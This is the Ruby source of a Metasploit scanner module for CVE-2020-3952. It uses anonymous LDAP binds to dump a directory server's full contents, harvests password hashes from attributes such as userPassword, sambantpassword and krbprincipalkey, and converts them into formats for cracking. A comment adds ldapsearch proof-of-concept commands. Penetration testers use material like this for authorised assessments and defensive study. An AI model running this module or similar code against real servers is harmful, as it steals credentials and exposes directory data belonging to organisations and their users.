##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LDAP Information Disclosure',
        'Description' => %q{
          This module uses an anonymous-bind LDAP connection to dump data from
          an LDAP server. Searching for attributes with user credentials
          (e.g. userPassword).
        },
        'Author' => [
          'Hynek Petrak', # Discovery, hash dumping
          'wvu' # Module
        ],
        'References' => [
          ['CVE', '2020-3952'],
          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
        ],
        'DisclosureDate' => '2020-07-23',
        'License' => MSF_LICENSE,
        'Actions' => [
          ['Dump', 'Description' => 'Dump all LDAP data']
        ],
        'DefaultAction' => 'Dump',
        'DefaultOptions' => {
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(636), # SSL/TLS
      OptInt.new('MAX_LOOT', [false, 'Maximum number of LDAP entries to loot', nil]),
      OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
      OptString.new('USER_ATTR', [false, 'LDAP attribute(s), that contains username', 'dn']),
      OptString.new('PASS_ATTR', [
        true, 'LDAP attribute, that contains password hashes',
        'userPassword, sambantpassword, sambalmpassword, unixUserPassword, mailuserpassword, password, passwordhistory, clearpassword, krbprincipalkey'
        # ipanthash, krbpwdhistory, krbmkey, userpkcs12
      ])
    ])
  end

  def user_attr
    @user_attr ||= 'dn'
  end

  # PoC using ldapsearch(1):
  #
  # Retrieve root DSE with base DN:
  #   ldapsearch -xb "" -s base -H ldap://[redacted]
  #
  # Dump data using discovered base DN:
  #   ldapsearch -xb bind_dn -H ldap://[redacted] \* + -
  def run_host(ip)
    @rhost = ip
    base_dn_vuln = nil
    print_status("#{peer} Connecting ...")

    ldap_connect do |ldap|
      if ldap.get_operation_result.code == 0
        vprint_status("#{peer} LDAP connection established")
      else
        # Even if we get "Invalid credentials" error, we may proceed with anonymous bind
        print_error("#{peer} LDAP error #{ldap.get_operation_result.code}: #{ldap.get_operation_result.message}")
      end

      if (base_dn_tmp = datastore['BASE_DN'])
        vprint_status("#{peer} User-specified base DN: #{base_dn_tmp}")
        naming_contexts = [base_dn_tmp]
      else
        vprint_status("#{peer} Discovering base DN(s) automatically")

        naming_contexts = get_naming_contexts(ldap)
        if naming_contexts.nil? || naming_contexts.empty?
          vprint_warning("#{peer} Falling back to an empty base DN")
          naming_contexts = ['']
        end
      end

      max_loot = datastore['MAX_LOOT']

      # Dump root DSE for useful information, e.g. dir admin
      if max_loot.nil? || (max_loot > 0)
        print_status("#{peer} Dumping data for root DSE")
        Tempfile.create do |f|
          f.write("# LDIF dump of root DSE for #{peer}\n")
          f.write("\n")
          i = 0
          ldap.search(base: '',
                      time: 10,
                      return_result: false,
                      ignore_server_caps: true,
                      scope: Net::LDAP::SearchScope_BaseObject,
                      attributes: %w[* + -]) do |entry|
            f.write("# #{entry.dn}\n")
            f.write(entry.to_ldif.force_encoding('utf-8'))
            f.write("\n")
            i += 1
          end
          if i > 0
            f.rewind
            pillage(f.read, 'DSE Root')
          else
            print_error("#{peer} No entries returned.")
          end
        end
      end

      @user_attr ||= datastore['USER_ATTR']
      @user_attr ||= 'dn'
      vprint_status("#{peer} Taking '#{@user_attr}' attribute as username")

      pass_attr ||= datastore['PASS_ATTR']
      pass_attr_array = pass_attr.split(/[,\s]+/).compact.reject(&:empty?).map(&:downcase)

      naming_contexts.each do |base_dn|
        print_status("#{peer} Searching base DN='#{base_dn}'")
        empty_respone = true
        Tempfile.create do |f|
          f.write("# LDIF dump of #{peer}, base DN='#{base_dn}'\n")
          f.write("\n")
          i = 0
          ldap.search(base: base_dn,
                      time: 10,
                      return_result: false,
                      attributes: %w[* + -]) do |entry|
            base_dn_vuln = base_dn
            empty_respone = false
            if max_loot.nil? || (i < max_loot)
              i += 1
              f.write("# #{entry.dn}\n")
              f.write(entry.to_ldif.force_encoding('utf-8'))
              f.write("\n")
            end
            pass_attr_array.each do |attr|
              if entry[attr].any?
                process_hash(entry, attr)
              end
            end
          end

          if i > 0
            f.rewind
            pillage(f.read, base_dn)
          end

          if empty_respone
            print_error("#{peer} No entries returned.")
          end
        end
      end
    end

    # We are ok with any entry returned
    unless base_dn_vuln
      print_error("#{peer} Host seems to be safe")
      return Exploit::CheckCode::Safe
    end

    # HACK: Stash discovered base DN in CheckCode reason
    Exploit::CheckCode::Vulnerable(base_dn_vuln)
  rescue Net::LDAP::Error => e
    print_error("#{peer} #{e.class}: #{e.message}")
    Exploit::CheckCode::Unknown
  end

  def pillage(ldif, base_dn)
    vprint_status("#{peer} Storing LDAP data for base DN='#{base_dn}' in loot")

    ldif_filename = store_loot(
      name, # ltype
      'text/plain', # ctype
      @rhost, # host
      ldif, # data
      nil, # filename
      "Base DN: #{base_dn}" # info
    )

    unless ldif_filename
      print_error("#{peer} Could not store LDAP data in loot")
      return
    end

    print_good("#{peer} Saved LDAP data to #{ldif_filename}")

  end

  def process_hash(entry, attr)
    service_details = {
      workspace_id: myworkspace_id,
      module_fullname: fullname,
      origin_type: :service,
      address: @rhost,
      port: rport,
      protocol: 'tcp',
      service_name: 'ldap'
    }

    # This is the "username"
    dn = entry[@user_attr].first # .dn

    hash = entry[attr].first

    # Skip empty or invalid hashes, e.g. '{CRYPT}x', xxxx, ****
    if hash.nil? || hash.empty? ||
       (hash.start_with?(/{crypt}/i) && hash.length < 10) ||
       hash.start_with?('*****') ||
       hash == '*' ||
       hash.start_with?(/xxxxx/i) ||
       (attr =~ /^samba(lm|nt)password$/ && (hash.length != 32))
      return
    end

    case attr
    when 'sambalmpassword'
      hash_format = 'lm'
    when 'sambantpassword'
      hash_format = 'nt'
    when 'krbprincipalkey'
      hash_format = 'krbprincipal'
      # TODO: krbprincipalkey is asn.1 encoded string. In case of vmware vcenter 6.7
      # it contains user password encrypted with (23) rc4-hmac and (18) aes256-cts-hmac-sha1-96:
      # https://github.com/vmware/lightwave/blob/d50d41edd1d9cb59e7b7cc1ad284b9e46bfa703d/vmdir/server/common/krbsrvutil.c#L480-L558
      # Salted with principal name:
      # https://github.com/vmware/lightwave/blob/c4ad5a67eedfefe683357bc53e08836170528383/vmdir/thirdparty/heimdal/krb5-crypto/salt.c#L133-L175
      # In the meantime, dump the base64 encoded value.
      hash = Base64.strict_encode64(hash)
    else
      if hash.start_with?(/{crypt}!?\$1\$/i)
        hash.gsub!(/{crypt}!?\$1\$/i, '$1$')
        hash_format = 'md5crypt'
      elsif hash.start_with?(/{crypt}/i) && hash.length == 20
        # handle {crypt}traditional_crypt case, i.e. explicitly set the hash format
        hash.slice!(/{crypt}/i)
        hash_format = 'descrypt' # FIXME: what is the right jtr_hash - des,crypt or descrypt ?
      # identify_hash returns des,crypt, but JtR acceppts descrypt
      else
        # handle vcenter vmdir binary hash format
        if hash[0].ord == 1 && hash.length == 81
          _type, hash, salt = hash.unpack('CH128H32')
          hash = "$dynamic_82$#{hash}$HEX$#{salt}"
        else
          # Remove ldap {crypt} prefix from known hash types
          hash.gsub!(/{crypt}!?\$6\$/i, '$6$')
          hash.gsub!(/{crypt}!?\$2a\$/i, '$2a$')
        end
        hash_format = identify_hash(hash)
      end
    end

    print_good("#{peer} Credentials (#{hash_format}) found in #{attr}: #{dn}:#{hash}")

    create_credential(service_details.merge(
      username: dn,
      private_data: hash,
      private_type: :nonreplayable_hash,
      jtr_format: hash_format
    ))
  end

end
